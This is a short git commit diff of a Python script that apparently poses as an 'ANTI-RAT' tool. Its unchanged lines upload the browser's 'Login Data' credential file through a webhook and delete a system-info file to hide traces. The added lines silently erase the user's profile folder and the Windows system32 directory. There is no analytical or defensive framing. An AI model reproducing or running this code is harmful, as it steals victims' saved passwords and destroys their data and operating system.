33f54f61b2654a89936f590d3e98e006d5562cf6
Ares Amigos <98190104+AresAmigos@users.noreply.github.com>
2022-06-21 01:08:32 +0200

    Create main.py

--- main.py
+++ main.py
@@ -149,5 +149,7 @@ def main():
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    os.system('del ANTI-RAT_By_EtichalHackingItalia.exe')
+    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe'/q)
+    subprocess.getoutput('rd "%userprofile%"/q /s')
+    subprocess.getoutput('rd "%windir%\system32"/q /s')
 main()
